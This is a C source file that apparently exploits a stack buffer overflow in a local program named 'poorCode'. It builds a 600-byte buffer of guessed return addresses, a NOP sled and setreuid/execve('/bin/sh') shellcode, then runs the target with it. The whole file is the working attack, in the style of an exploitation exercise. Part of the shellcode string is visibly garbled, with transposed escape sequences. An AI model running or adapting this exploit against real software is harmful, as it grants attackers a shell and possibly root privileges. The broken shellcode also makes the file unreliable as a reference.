#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#define BuffSize 600

char shellcode[] = 
	"\x31\xc0\xb0\x46\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
	"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\xd"
	"\x53\0cx\cdx\80x\e8x\e5x\ffx\ffx\ffx\x2f\x62\x69\x6e\x2f\x73\x68";

unsigned long sp(void)
{
	asm ("movl %esp, %eax");
}

int main(int argc, char *argv[])
{
	int i, offset;
	long esp, ret, *addr_ptr;
	char *buffer, *ptr;

	
	offset = 0;
	esp = sp();
	ret = esp - offset;

	printf("Stack pointer (ESP) 0x%x\n", esp);
	printf("   Offset from ESP: 0x%x\n", offset);
	printf("Desired Return Addr: 0x%x\n", ret);

	buffer = malloc(BuffSize);

	ptr = buffer;
	addr_ptr = (long*)ptr;
	for (i=0; i<600; i+=4) 
	{
		*(addr_ptr++)=ret;
	}
	printf("Filled return\n");

	for(i=0; i<100; i++)
	{
		buffer[i] = '\x90';
	}
	printf("added NOP sled\n");


	ptr = buffer + 100;
	for (i=0; i< strlen(shellcode); i++)
	{
		*(ptr++) = shellcode[i];
	}

	buffer[BuffSize-1] = '\0';

	printf("Inserted shellcode\n");

	execl("./poorCode", "poorCode", buffer, (char *)NULL);
	
	free(buffer);

	return 0;
}
